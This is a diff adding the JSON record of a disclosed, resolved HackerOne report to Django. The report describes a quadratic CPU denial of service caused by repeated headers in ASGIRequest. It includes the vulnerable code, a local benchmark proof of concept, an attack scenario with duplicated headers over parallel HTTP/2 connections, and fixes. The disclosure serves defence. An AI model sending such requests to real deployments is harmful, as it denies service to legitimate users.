@@ -1,0 +1,111 @@
+{
+  "id": 3426417,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDI2NDE3",
+  "url": "https://hackerone.com/reports/3426417",
+  "title": "ASGIRequest header concatenation quadratic CPU DoS on Django via repeated headers leads to worker exhaustion",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2025-11-14T18:53:15.240Z",
+  "submitted_at": "2025-11-14T18:53:15.310Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sy2n0",
+    "url": "/sy2n0",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23,
+    "url": "https://hackerone.com/django",
+    "handle": "django",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Django",
+      "twitter_handle": null,
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-02-09T15:05:03.436Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-02-09T14:37:27.641Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# ASGIRequest header concatenation quadratic CPU DoS\n\n**Reporter:** Jiyong Yang / BAEKSEOK University \n**Target:** Django (current `main`, affects all versions with ASGI support)  \n**Type:** Denial of Service (CPU exhaustion)\n\n## Summary\n`django.core.handlers.asgi.ASGIRequest` builds the `META` dictionary by iterating over the ASGI `scope[\"headers\"]` array. Whenever the same header name appears multiple times (which is legal in HTTP/2 and HTTP/3), the code concatenates the previous value and the new chunk via `value = existing + \",\" + new`. Because Python strings are immutable, each concatenation copies the entire accumulated value. If an attacker repeats a header `n` times, the loop performs `1 + 2 + … + n = Θ(n²)` bytes of copying before the request even reaches view code. A single request with a few thousand duplicated headers therefore ties up the worker CPU and creates a denial-of-service condition on any Django ASGI deployment.\n\n```85:103:django/django/core/handlers/asgi.py\n        for name, value in self.scope.get(\"headers\", []):\n            name = name.decode(\"latin1\")\n            if name == \"content-length\":\n                corrected_name = \"CONTENT_LENGTH\"\n            elif name == \"content-type\":\n                corrected_name = \"CONTENT_TYPE\"\n            else:\n                corrected_name = \"HTTP_%s\" % name.upper().replace(\"-\", \"_\")\n            value = value.decode(\"latin1\")\n            if corrected_name == \"HTTP_COOKIE\":\n                value = value.rstrip(\"; \")\n                if \"HTTP_COOKIE\" in self.META:\n                    value = self.META[corrected_name] + \"; \" + value\n            elif corrected_name in self.META:\n                value = self.META[corrected_name] + \",\" + value\n            self.META[corrected_name] = value\n```\n\n## Impact\n- One HTTP/2 request that repeats a short header 8,000–16,000 times consumes several hundred milliseconds to multiple seconds of CPU just to build the request object. No body payload is required.\n- Attackers can open a handful of parallel connections and keep ASGI workers (uvicorn + gunicorn, Daphne, etc.) saturated, preventing legitimate traffic from being served.\n- The attack stays within Django's documented limits (URLs/headers < 8 KB, body < 2.5 MB) and requires no special configuration changes, so it satisfies the Django security policy.\n\n## Proof of Concept\nThe following script imports Django from the repository, constructs `ASGIRequest` objects with varying header counts, and measures how long `__init__()` spends concatenating:\n\n```python\nimport sys, time\nfrom io import BytesIO\n\nsys.path.insert(0, \"/django-poc\")\nsys.path.insert(0, \"/django-poc/django\")\nimport asgiref.sync\n\nclass ThreadSensitiveContext:\n    async def __aenter__(self): return self\n    async def __aexit__(self, exc_type, exc, tb): return False\n\nasgiref.sync.ThreadSensitiveContext = ThreadSensitiveContext\n\nfrom django.conf import settings\nif not settings.configured:\n    settings.configure(DEBUG=False, SECRET_KEY=\"x\", ROOT_URLCONF=__name__,\n                       ALLOWED_HOSTS=[\"*\"], USE_TZ=True)\n\nimport django\ndjango.setup()\nfrom django.core.handlers.asgi import ASGIRequest\n\ndef bench(n, header_len=128):\n    scope = {\n        \"type\": \"http\",\n        \"scheme\": \"http\",\n        \"path\": \"/\",\n        \"method\": \"GET\",\n        \"headers\": [(b\"cookie\", b\"a=1\" * (header_len // 4)) for _ in range(n)],\n        \"query_string\": b\"\",\n    }\n    start = time.perf_counter()\n    ASGIRequest(scope, BytesIO(b\"\"))\n    return time.perf_counter() - start\n\nfor n in (2_000, 4_000, 8_000, 16_000):\n    print(f\"{n} headers -> {bench(n):.6f}s\")\n```\n\nExample output on my M3 system:\n\n```\n2000 headers -> 0.015708s\n4000 headers -> 0.066771s\n8000 headers -> 0.233624s\n16000 headers -> 1.131225s\n```\n\nDoubling the header count quadruples the runtime, clearly showing the Θ(n²) growth. All requests used zero body bytes and only ~2 MB of total header data, so they comply with Django's policy limits.\n\n## Attack Scenario\n1. Open an HTTP/2 connection to the Django ASGI deployment (gunicorn+uvicorn, Daphne, etc.).\n2. Send a GET request with one cookie (or any header) duplicated thousands of times, keeping individual header values small (<128 B) and leaving the body empty.\n3. `ASGIRequest` concatenates each copy into `META`, burning CPU before middleware or views run.\n4. Repeat on a few concurrent connections to keep all worker processes busy and deny service to legitimate users.\n\n## Root Cause\nThe request constructor stores repeated headers as a single comma-delimited string by copying the full accumulated value at every iteration. Because Python strings are immutable, each `existing + \",\" + value` operation reallocates and copies the entire string. There is no upper bound on repeated headers and no streaming/buffering mechanism, so the loop performs Θ(n²) work for Θ(n) input.\n\n## Remediation Ideas\n1. Collect repeated headers in lists (e.g., `defaultdict(list)`) and only call `\",\".join(values)` after the loop, reducing the complexity to O(n).\n2. For cookies, use `\"; \".join(...)` with the same approach instead of repeated string concatenation.\n3. Optionally enforce a sane maximum repetition count per header name to fail fast on absurd inputs.\n\n## Policy Fit\n- Inputs remain within Django's published limits (body under 2.5 MB, headers under 8 KB per entry).\n- Attack works against default ASGI deployments with no custom settings.\n- Impact is a classic CPU exhaustion DoS, explicitly listed as in-scope for Django's security program.\n\n## Timeline\n- 2025-11-14: Issue discovered and locally benchmarked.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-03-11T14:37:27.979Z",
+  "allow_singular_disclosure_after": -4499263.582919646,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "aboalezz",
+    "zy9ard3",
+    "yoyomiski",
+    "mohaned0101",
+    "2026",
+    "xia0checkmate_jotp",
+    "mohammadtayb",
+    "hacker-kartel",
+    "rootk1m",
+    "tnt777",
+    "and 14 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
